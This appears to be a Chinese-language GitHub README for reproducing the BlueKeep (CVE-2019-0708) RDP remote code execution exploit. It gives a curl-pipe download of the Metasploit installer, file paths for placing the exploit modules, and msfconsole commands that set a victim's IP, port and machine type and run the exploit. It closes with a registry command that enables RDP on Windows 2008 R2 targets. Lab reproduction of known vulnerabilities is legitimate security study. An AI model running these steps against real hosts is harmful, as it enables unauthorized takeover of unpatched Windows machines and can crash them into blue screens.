# CVE-2019-0708-RCE
![](https://img.shields.io/badge/msf-5-red)
![](https://img.shields.io/badge/kali-2.0-brightgreen)
![](https://img.shields.io/badge/Windows7-ultimate_SP1-green)
![](https://img.shields.io/badge/Windows8-R2-green)
![](https://img.shields.io/badge/Success-%E2%98%85%E2%98%85%E2%98%86%E2%98%86%E2%98%86-brightgreen)
![](https://img.shields.io/badge/%E8%93%9D%E5%B1%8F-%E2%98%85%E2%98%85%E2%98%85%E2%98%85%E2%98%86-brightgreen)

Win7环境：
ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/

kali安装更新 

curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \  chmod 755 msfinstall && \  ./msfinstall


下载攻击套件放置文件到msf的相应文件夹(如果已存在同名文件,直接覆盖即可)


rdp.rb   ->   /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb

rdp_scanner.rb   ->   /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb

cve_2019_0708_bluekeep.rb   ->   /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb

cve_2019_0708_bluekeep_rce.rb   ->   /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb


利用过程：


>>msfconsole

>>reload_all

>>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

>>set target=3

>>run


使用set RHOSTS 受害机IP设置受害机IP  
使用set RPORT 受害机PORT设置受害机RDP端口号  
使用set target ID数字(可选为0-4)设置受害机机器架构  
1：实体机       2：VirtualBox        3：VMware       4：Hyper-v

![image](https://github.com/mai-lang-chai/CVE-2019-0708-RCE/blob/master/pic/w.png)


__利用环境很苛刻，使用默认配置安装Win7_ultimate_sp1，其他版本会出现蓝屏__

![image](https://github.com/mai-lang-chai/CVE-2019-0708-RCE/blob/master/pic/2.png)


===============================================================================


Windows 2008 r2需要修改注册表才能复现成功


执行@echo offcolor 1c sc config MpsSvc start= auto sc start MpsSvc reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f
